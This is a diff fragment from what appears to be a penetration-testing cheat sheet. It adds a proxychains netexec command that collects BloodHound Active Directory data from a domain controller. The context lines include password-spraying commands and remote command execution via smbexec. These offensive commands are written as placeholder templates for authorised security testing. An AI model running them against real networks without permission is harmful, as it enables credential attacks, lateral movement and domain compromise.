@@ -5319,6 +5319,7 @@ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WO
 netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> -x 'quser'
 netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> -x 'net user Administrator /domain' --exec-method smbexec
 netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p '-p /PATH/TO/WORDLIST/<WORDLIST>!' -d DOMAIN --continue-on-success
+proxychains -q nxc ldap DC1.DOMAIN -d 'DOMAIN' -u 'USER' -p 'PASS' --bloodhound -c All --dns-server IP_dc --dns-tcp
 ```
 
 #### pypykatz
